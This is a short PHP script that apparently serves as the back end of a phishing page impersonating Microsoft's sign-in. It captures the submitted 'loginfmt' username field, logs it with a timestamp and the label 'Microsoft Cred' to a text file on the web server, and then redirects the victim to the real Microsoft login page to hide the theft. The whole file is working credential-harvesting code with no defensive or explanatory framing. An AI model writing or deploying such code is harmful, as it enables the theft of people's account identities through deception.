<?php

file_put_contents("/var/www/html/microsoft/usernames.txt", date("m/d/Y") . " " . date("h:i:s") . " Microsoft Cred: " . $_POST['loginfmt'] . "\n", FILE_APPEND);

header('Location: https://login.microsoftonline.com');

exit();

?>
